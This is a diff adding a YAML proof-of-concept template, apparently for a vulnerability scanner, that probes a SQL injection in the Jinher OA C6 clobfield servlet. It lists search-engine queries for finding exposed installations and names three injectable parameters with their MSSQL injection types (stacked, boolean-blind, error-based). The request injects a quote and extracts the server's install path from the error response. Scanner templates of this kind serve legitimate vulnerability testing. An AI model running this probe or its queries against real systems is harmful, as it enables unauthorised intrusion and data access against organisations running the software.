@@ -1,0 +1,43 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql  三个注入参数 |   sTablename  mssql (叠堆注入) |   sKeyname   mssql (布尔盲注) |   sKeyvalue   mssql (叠堆注入,报错注入)
+
+
+name: poc-yaml-jinhe-c6-clobfield-sqli
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /jc6/servlet/clobfield
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        SL-CE-SUID: 77
+      body: key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1'
+    expression: >-
+      response.status == 200 && response.body_string.contains("引号")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+expression: r0() 
